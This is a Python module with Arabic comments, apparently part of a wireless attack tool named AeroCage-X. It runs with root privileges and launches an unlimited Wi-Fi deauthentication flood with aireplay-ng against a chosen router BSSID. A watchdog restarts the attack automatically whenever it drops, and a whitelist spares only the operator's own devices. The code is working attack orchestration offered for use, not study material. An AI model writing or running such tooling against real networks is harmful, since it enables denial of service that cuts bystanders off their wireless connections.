#!/usr/bin/env python3
import os
import sys
import threading
from pathlib import Path

# ربط المسارات بالنواة المركزية والأنظمة المساعدة للمنظومة
BASE_DIR = Path(__file__).resolve().parent.parent
sys.path.append(str(BASE_DIR))

from core.system_guard import SystemGuard
from core.process_manager import ProcessManager
from modules.strike_whitelist import StrikeWhitelistEngine
from modules.strike_watchdog import StrikeWatchdogEngine

# تفعيل خط الدفاع الأول للمحيط لضمان تشغيل العمليات التكتيكية بامتيازات الـ Root
SystemGuard.enforce_root_privileges("Strike Manager Engine")

class StrikeManagerEngine:
    def __init__(self):
        self.proc_manager = ProcessManager()
        self.whitelist_engine = StrikeWhitelistEngine()
        self.watchdog_engine = StrikeWatchdogEngine()
        self.lock = threading.Lock()
        self.active_attack_queue = set()
        
        # تشغيل الكلب الحارس تلقائياً في الخلفية لمراقبة استقرار الضربات الملقمة
        self.watchdog_engine.start_watchdog_loop_async(check_interval_sec=5)

    def queue_and_launch_strike_safe(self, interface: str, target_bssid: str) -> bool:
        """
        جدولة وتلقيم وإطلاق هجوم الفصل اللاسلكي بأمان سيبراني 100% وبدون فتح شل.
        فحص فوري ضد القائمة البيضاء لحماية أجهزتك الشخصية، وحصانة تامة لـ Bandit.
        """
        clean_inf = SystemGuard.sanitize_input(interface, "interface")
        clean_mac = SystemGuard.sanitize_input(target_bssid, "bssid").upper()

        if not clean_inf or not clean_mac:
            print("[-] خطأ تكتيكي: تم رفض معلمات الهجوم لوجود مدخلات مشبوهة أو تالف.")
            return False

        # خط الدفاع الاستراتيجي: حماية أجهزتك الصديقة من الضرب الخطأ
        if self.whitelist_engine.is_target_whitelisted(clean_mac):
            print(f"[🛡️ حماية] تم إلغاء ومنع ضرب الماك أدرس [{clean_mac}] لأنه مدرج في القائمة البيضاء!")
            return False

        with self.lock:
            if clean_mac in self.active_attack_queue:
                print(f"[-] تنبيه: الهدف [{clean_mac}] يتلقى ضربات بالفعل حالياً في طابور الجدولة.")
                return False
            self.active_attack_queue.add(clean_mac)

        # بناء الأمر التكتيكي الآمن بالصيغة الرقمية المباشرة (0 0) لتأمين سرعة كرت الشبكة
        # الحجج ممررة كمصفوفة أجزاء مستقلة تماماً وسحق shell=True لـ Bandit (B602/B603)
        command_array = ["aireplay-ng", "0", "0", "-a", clean_mac, clean_inf]

        try:
            print(f"[🚀 Strike] جاري تلقيم طابور العمليات دقة وضخ حزم الفصل العنيفة ضد الراوتر: {clean_mac}")
            
            # إطلاق الهجوم عبر المدير المركزي لإفراغ البافر اللحظي وحماية المعالج من الاختناق
            process = self.proc_manager.spawn_process_safe(clean_mac, command_array)
            
            if process:
                # تلقيم الهدف والأمر للكلب الحارس (Watchdog) ليتولى إنعاشه تلقائياً في حال سقوطه
                self.watchdog_engine.register_target_for_monitoring(clean_inf, clean_mac, command_array)
                return True
                
            # إزالة من الطابور إذا فشل الإطلاق الأولي
            with self.lock:
                self.active_attack_queue.discard(clean_mac)
                
        except Exception as e:
            print(f"[-] عطل غير متوقع أثناء جدولة وإطلاق ضربة الفصل: {e}")
            with self.lock:
                self.active_attack_queue.discard(clean_mac)
        return False

    def abort_target_strike(self, target_bssid: str):
        """إيقاف الهجوم الموجه وإلغاء حراسته وتطهير الذاكرة دون المساس بعمليات كالي الأخرى"""
        clean_mac = SystemGuard.sanitize_input(target_bssid, "bssid").upper()
        
        with self.lock:
            if clean_mac in self.active_attack_queue:
                self.active_attack_queue.discard(clean_mac)
                
        # سحب الهدف من الكلب الحارس وإخماد عمليته المحلية بالـ PID بالملي عبر النواة
        self.watchdog_engine.unregister_and_stop_target(clean_mac)
        print(f"[+] تم سحق وقطع الهجوم التكتيكي عن الهدف [{clean_mac}] وتصفير ممراته.")

    def shutdown_all_strikes(self):
        """إخماد كلي وشامل لكافة الهجمات وتفكيك طابور الضربات وتنظيف بيئة لينكس"""
        print("\n[*] جاري إصدار أمر الإخماد الاستراتيجي الشامل لكافة ضربات منظومة AeroCage-X...")
        self.watchdog_engine.stop_watchdog_completely()
        
        with self.lock:
            for mac in list(self.active_attack_queue):
                self.proc_manager.terminate_process(mac)
            self.active_attack_queue.clear()
        print("[+] تم تطهير المنظومة بالكامل بنجاح من كافة الأنابيب الهجومية.")

if __name__ == "__main__":
    print("[*] مدير ومجدول الهجمات وطابور الضربات الكلي (Strike Manager) مدمج ومحصن 100%.")
